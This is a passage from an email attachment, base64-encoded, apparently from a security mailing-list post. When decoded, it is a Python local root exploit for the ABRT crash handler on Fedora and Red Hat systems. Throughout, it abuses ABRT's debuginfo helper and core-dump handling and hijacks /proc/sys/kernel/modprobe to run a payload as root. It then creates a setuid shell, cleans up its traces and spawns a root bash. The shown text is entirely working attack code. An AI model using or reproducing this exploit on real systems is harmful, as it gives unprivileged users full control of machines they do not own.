L3VucGFja2VkLmNwaW8iKQoJCQlwcmludCAiY3JlYXRlZCAlcyIgJSBkCgkJ
ZXhjZXB0OiBwYXNzCgoJb3MuZXhlY2woIi91c3IvbGliZXhlYy9hYnJ0LWFj
dGlvbi1pbnN0YWxsLWRlYnVnaW5mby10by1hYnJ0LWNhY2hlIiwiYWJydC1h
Y3Rpb24taW5zdGFsbC1kZWJ1Z2luZm8tdG8tYWJydC1jYWNoZSIsIi15IikK
CnRyeToKCW9zLm1rZmlmbygiL3Zhci90bXAvaGF4ZmlmbyIpCglvcy5jaG1v
ZCgiL3Zhci90bXAvaGF4ZmlmbyIsMDY2NikKZXhjZXB0OgoJcGFzcwoKZGVm
IGZpZm8oYSk6CglwcmludCAicmVhZGluZyBmcm9tIGZpZm8uLiIKCW9wZW4o
Ii92YXIvdG1wL2hheGZpZm8iKS5yZWFkKCkKCXByaW50ICJkb25lIgoKCXBy
aW50ICJ3cml0aW5nIHRvIGZpZm8uLiIKCW9wZW4oIi92YXIvdG1wL2hheGZp
Zm8iLCJ3KyIpLndyaXRlKGEpCglwcmludCAiZG9uZSIKCmlmIG9zLmZvcmso
KSA9PSAwOiBjaGlsZCgpCgpwcmludCAiZmlyc3QgY3Bpby4uLiIKZmlmbyhj
cGlvMSkKCm9zLndhaXQoKQp0aW1lLnNsZWVwKDEpCgppZiBvcy5mb3JrKCkg
PT0gMDogY2hpbGQoKQpwcmludCAic2Vjb25kIGNwaW8uLi4iCmZpZm8oY3Bp
bzIpCgpvcy53YWl0KCkKdGltZS5zbGVlcCgxKQoKaWYgZmVkb3JhOgoJc3lt
ID0gIi92YXIvdG1wL2FicnQvYWJydC1oYXgtY29yZWR1bXAiCmVsc2U6Cglz
eW0gPSAiL3Zhci9zcG9vbC9hYnJ0L2FicnQtaGF4LWNvcmVkdW1wIgoKdHJ5
OgoJb3MubHN0YXQoc3ltKQpleGNlcHQ6CglwcmludCAiY291bGQgbm90IGNy
ZWF0ZSBzeW1saW5rIgoJc3lzLmV4aXQoLTEpCgpwcmludCAiJXMgY3JlYXRl
ZCIgJSBzeW0KCm9wZW4oIi90bXAvYWJydC1oYXgiLCJ3KyIpLndyaXRlKGVs
ZikKb3MuY2htb2QoIi90bXAvYWJydC1oYXgiLDA3NTUpCgppZiBvcy5mb3Jr
KCkgPT0gMDoKCXJlc291cmNlLnNldHJsaW1pdChyZXNvdXJjZS5STElNSVRf
Q09SRSwocmVzb3VyY2UuUkxJTV9JTkZJTklUWSxyZXNvdXJjZS5STElNX0lO
RklOSVRZLCkpCglwcmludCAiZXhlY3V0aW5nIGNyYXNoaW5nIHByb2Nlc3Mu
LiIKCW9zLmV4ZWNsZSgiL3RtcC9hYnJ0LWhheCIsIiIse30pCgpvcy53YWl0
KCkKdGltZS5zbGVlcCgxKQkKCmlmICIvdG1wL2hheCIgbm90IGluIG9wZW4o
Ii9wcm9jL3N5cy9rZXJuZWwvbW9kcHJvYmUiKS5yZWFkKCk6CglwcmludCAi
Y291bGQgbm90IG1vZGlmeSAvcHJvYy9zeXMva2VybmVsL21vZHByb2JlIgoJ
c3lzLmV4aXQoLTEpCgpvcGVuKCIvdG1wL2hheC5zaCIsIncrIikud3JpdGUo
cGF5bG9hZCkKb3MuY2htb2QoIi90bXAvaGF4LnNoIiwwNzU1KQoKdHJ5OgoJ
c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJF
QU0sMTMyKQpleGNlcHQ6CglwYXNzCgp0aW1lLnNsZWVwKDAuNSkKCnRyeToK
CW9zLnN0YXQoIi90bXAvc2giKQpleGNlcHQ6CglwcmludCAiY291bGQgbm90
IGNyZWF0ZSBzdWlkIgoJc3lzLmV4aXQoLTEpCgpwcmludCAic3VjY2VzcyIK
Cm9zLmV4ZWNsKCIvdG1wL3NoIiwic2giLCItcCIsIi1jIiwnJydlY2hvIC9z
YmluL21vZHByb2JlID4gL3Byb2Mvc3lzL2tlcm5lbC9tb2Rwcm9iZTtybSAt
ZiAvdG1wL3NoO3JtIC1yZiAvdmFyL2NhY2hlL2FicnQtZGkvaGF4O3B5dGhv
biAtYyAiaW1wb3J0IG9zO29zLnNldHJlc3VpZCgwLDAsMCk7b3MuZXhlY2wo
Jy9iaW4vYmFzaCcsJ2Jhc2gnKTsiJycnKQo=

--001a11452ca85cd2530525cbd6c7--
